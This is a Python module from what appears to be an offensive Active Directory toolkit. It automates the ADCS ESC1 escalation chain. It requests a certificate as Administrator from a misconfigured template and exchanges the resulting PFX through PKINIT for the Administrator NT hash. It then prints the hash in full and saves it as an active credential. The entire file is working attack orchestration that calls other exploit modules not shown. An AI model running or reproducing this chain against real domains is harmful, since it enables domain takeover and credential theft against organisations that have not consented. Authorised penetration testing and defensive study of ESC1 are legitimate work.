import argparse
import os
import shutil
import time
from pathlib import Path
from core.runner import run_module_by_name
from core.target import load_current_profile, target_set_cred, target_add_cred
from core.paths import get_chain_artifacts_dir

def run(args):
    # --- ANSI COLOR PALETTE ---
    G, R, C, Y, B, W = '\033[92m', '\033[91m', '\033[96m', '\033[94m', '\033[94m', '\033[0m'
    BOLD = '\033[1m'

    # --- 1. SETUP & LOAD ---
    data, _ = load_current_profile()
    artifacts = get_chain_artifacts_dir(data["name"], "esc1")

    # --- HEADER ---
    print(f"\n{B}┌──────────────────────────────────────────────────────────┐{W}")
    print(f"{B}│{W}  {BOLD}{C}CHAIN:{W} ADCS ESC1 DOMAIN ESCALATION                   {B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    # --- PRECHECK ---
    if not data.get("domain") or not data.get("ip"):
        print(f"\n{R}[!] Error: Domain and IP must be set in the profile.{W}")
        return

    adcs = data.get("adcs", {})
    templates = adcs.get("templates", [])

    if not templates:
        print(f"    {B}╰─{W} {R}No ADCS templates found (run ad.certfind first){W}")
        return

    template = templates[0]["name"]

    if not getattr(args, "auto", False):
        prompt = f"\n    {B}[{W}{C}?{W}{B}]{W} Start {BOLD}ESC1 (Template: {template}){W} chain? (Y/n): "
        if not input(prompt).lower() in ["", "y"]:
            print(f"{Y}[*] Chain aborted by user.{W}")
            return

    # --- STEP 1: CERT REQUEST ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 1: CERTIFICATE FORGERY{W}")
    print(f"    {B}╰─{W} Requesting as: {C}Administrator{W}")
    print(f"    {B}╰─{W} Using Template: {Y}{template}{W}")
    
    run_module_by_name("ad.certreq", [template, "--user", "administrator"], data)

    # --- STEP 2: LOCATE PFX ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 2: ARTIFACT LOCALIZATION{W}")
    
    pfx = None
    local_pfx = Path("administrator.pfx")

    if local_pfx.exists():
        shutil.move(str(local_pfx), artifacts / "administrator.pfx")
        pfx = artifacts / "administrator.pfx"
        print(f"    {B}╰─{W} Status: {G}PFX moved to artifacts directory{W}")
    else:
        # Sort by mtime to get the freshest cert
        pfx_files = sorted(artifacts.glob("*.pfx"), key=os.path.getmtime)
        if pfx_files:
            pfx = pfx_files[-1]

    if not pfx:
        print(f"    {B}╰─{W} {R}Error: Could not find administrator.pfx{W}")
        return

    print(f"    {B}╰─{W} Active PFX: {C}{pfx.name}{W}")

    # --- STEP 3: NT HASH EXTRACTION ---
    # --- STEP 3: NT HASH EXTRACTION ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 3: NT HASH EXTRACTION{W}")
    print(f"    {B}╰─{W} Exchanging certificate for NT Hash...", end="\r")
    
    # Executing the module
    result = run_module_by_name("ad.certauth", [str(pfx)], data)
    
    print(f"    {B}╰─{W} PKINIT Exchange: {G}COMPLETE{W}                         ")

    # --- STEP 4: HASH VERIFICATION ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 4: HASH VERIFICATION{W}")
    
    nt_hash = None

    # HANDLE BOTH RETURN TYPES:
    # Case A: result is the full data dict
    if isinstance(result, dict) and "creds" in result:
        new_cred = result["creds"][-1]
        if new_cred.get("type") == "ntlm":
            nt_hash = new_cred["secret"]

    # Case B: result is the list returned directly by ad.certauth
    elif isinstance(result, list) and len(result) > 0:
        if result[0].get("type") == "ntlm":
            nt_hash = result[0]["secret"]

    if not nt_hash:
        print(f"    {B}╰─{W} {R}Error: New NTLM hash not found in module output.{W}")
        # Debugging: print(f"DEBUG: Result was type {type(result)}")
        return

    print(f"    {B}╰─{W} Recovered Hash: {G}{nt_hash[:10]}...{W}")

    # --- STEP 5: DATABASE UPDATE ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 5: SESSION PERSISTENCE{W}")
    print()
    print(f"    {G}┌──{W} {BOLD}ELEVATED HASH CAPTURED{W}")
    print(f"    {G}│{W} {BOLD}IDENTITY:{W} {C}Administrator{W}")
    print(f"    {G}│{W} {BOLD}NT HASH:{W} {G}{nt_hash}{W}")
    print(f"    {G}└──{W}")

    target_add_cred(
        argparse.Namespace(
            user="Administrator",
            password=None,
            hash=nt_hash,  # Store the NT hash here
            aes=None,
            ccache=None    # We can skip the ticket now
        ),show=True, switch=True
    )


    print(f"\n{B}─────────────────────── {G}CHAIN COMPLETE{W} ───────────────────────\n")